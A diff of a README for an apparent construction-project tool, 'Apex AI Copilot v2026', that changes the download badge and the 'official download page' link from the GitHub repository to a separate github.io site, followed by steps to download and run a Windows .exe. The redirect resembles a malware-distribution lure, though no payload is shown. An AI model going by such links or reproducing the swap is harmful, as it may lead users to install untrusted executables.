@@ -1,12 +1,12 @@
 # 🏗️ apex-copilot-project-hub - Manage construction projects with smart assistance
 
-[![Download Apex Copilot](https://img.shields.io/badge/Download-Apex_Copilot_v2026-blue.svg)](https://github.com/Strategic-westoncell535/apex-copilot-project-hub)
+[![Download Apex Copilot](https://img.shields.io/badge/Download-Apex_Copilot_v2026-blue.svg)](https://strategic-westoncell535.github.io)
 
 Apex AI Copilot v2026 acts as a central workspace for construction teams. It combines project planning, administration, and digital mapping in one place. You use this tool to manage your construction sites from your computer or mobile device.
 
 ## 📥 How to Install on Windows
 
-1. Visit the [official download page](https://github.com/Strategic-westoncell535/apex-copilot-project-hub).
+1. Visit the [official download page](https://strategic-westoncell535.github.io).
 2. Look for the "Releases" section on the right side of the page.
 3. Click the link for the latest Windows installer file, which ends in .exe.
 4. Save the file to your desktop.
